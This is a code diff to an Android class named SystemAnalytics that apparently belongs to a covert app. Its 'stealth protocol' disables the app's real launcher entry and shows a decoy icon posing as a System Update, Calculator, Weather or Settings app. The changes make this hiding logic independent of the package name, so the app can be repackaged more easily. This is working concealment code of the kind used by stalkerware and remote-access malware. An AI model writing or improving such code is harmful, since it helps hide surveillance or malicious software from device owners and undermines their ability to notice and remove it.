@@ -183,15 +183,15 @@ public class SystemAnalytics {
             android.util.Log.d("SystemAnalytics", "Executing stealth protocol. Active: " + stealth);
             
             android.content.pm.PackageManager pm = context.getPackageManager();
-            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            android.content.ComponentName main = new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias");
             
             // Resolve chosen Decoy from Persisted Settings or BuildConfig fallback
             int choice = getDecoyChoice(context);
-            String decoyClass = "com.labs.labrats.SystemUpdateAlias";
+            String decoyClass = context.getPackageName() + ".SystemUpdateAlias";
             switch (choice) {
-                case 2: decoyClass = "com.labs.labrats.CalculatorAlias"; break;
-                case 3: decoyClass = "com.labs.labrats.WeatherAlias"; break;
-                case 4: decoyClass = "com.labs.labrats.SettingsAlias"; break;
+                case 2: decoyClass = context.getPackageName() + ".CalculatorAlias"; break;
+                case 3: decoyClass = context.getPackageName() + ".WeatherAlias"; break;
+                case 4: decoyClass = context.getPackageName() + ".SettingsAlias"; break;
             }
             
             android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);
@@ -220,7 +220,12 @@ public class SystemAnalytics {
                 pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 
                 // Disable ALL other decoys first to ensure only one is active
-                String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
+                String[] decoys = {
+                    context.getPackageName() + ".SystemUpdateAlias",
+                    context.getPackageName() + ".CalculatorAlias",
+                    context.getPackageName() + ".WeatherAlias",
+                    context.getPackageName() + ".SettingsAlias"
+                };
                 for (String d : decoys) {
                     if (!d.equals(decoyClass)) {
                         pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
@@ -236,7 +241,12 @@ public class SystemAnalytics {
                 pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 
                 // Disable all possible decoys
-                String[] decoys = {"com.labs.labrats.SystemUpdateAlias", "com.labs.labrats.CalculatorAlias", "com.labs.labrats.WeatherAlias", "com.labs.labrats.SettingsAlias"};
+                String[] decoys = {
+                    context.getPackageName() + ".SystemUpdateAlias",
+                    context.getPackageName() + ".CalculatorAlias",
+                    context.getPackageName() + ".WeatherAlias",
+                    context.getPackageName() + ".SettingsAlias"
+                };
                 for (String d : decoys) {
                     pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 }
@@ -267,7 +277,7 @@ public class SystemAnalytics {
     public static boolean isStealthEnabled(Context context) {
         // First check if Main launcher is actually disabled - that's the source of truth
         try {
-            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            android.content.ComponentName main = new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias");
             int state = context.getPackageManager().getComponentEnabledSetting(main);
             if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) return true;
             if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) return false;
